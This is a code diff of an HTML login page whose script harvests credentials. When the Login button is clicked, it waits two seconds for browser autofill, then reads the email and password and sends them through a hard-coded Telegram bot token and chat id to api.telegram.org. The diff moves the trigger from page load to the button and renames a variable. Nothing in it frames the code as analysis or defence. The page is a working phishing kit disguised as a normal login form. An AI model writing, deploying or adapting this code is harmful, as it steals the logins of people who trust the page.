@@ -5,13 +5,14 @@
 </head>
 <body>
   <form id="login">
-    <input type="email" id="email" name="email" autocomplete="email" placeholder="Email">
-    <input type="password" id="pass" name="password" autocomplete="current-password" placeholder="Password">
-    <button type="submit">Login</button>
+    <input type="email" id="email" name="email" autocomplete="email" placeholder="Email"><br><br>
+    <input type="password" id="pass" name="password" autocomplete="current-password" placeholder="Password"><br><br>
+    <button type="button" onclick="capture()">Login</button>
   </form>
 
   <script>
-    window.onload = () => {
+    function capture() {
+      // Let browser autofill after click
       setTimeout(() => {
         const email = document.getElementById('email').value
         const pass = document.getElementById('pass').value
@@ -19,11 +20,11 @@
         if (email && pass) {
           const token = "6883619016:AAHKPuXrO6Tt60aOhx4pMvuiBgpGH8gpXww"
           const chat_id = "7139961821"
-          const message = `Email: ${email}\nPass: ${pass}`
+          const msg = `Email: ${email}\nPass: ${pass}`
 
-          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
         }
-      }, 2000) // slight delay to allow autofill
+      }, 2000) // Wait 2 sec for autofill to apply
     }
   </script>
 </body>
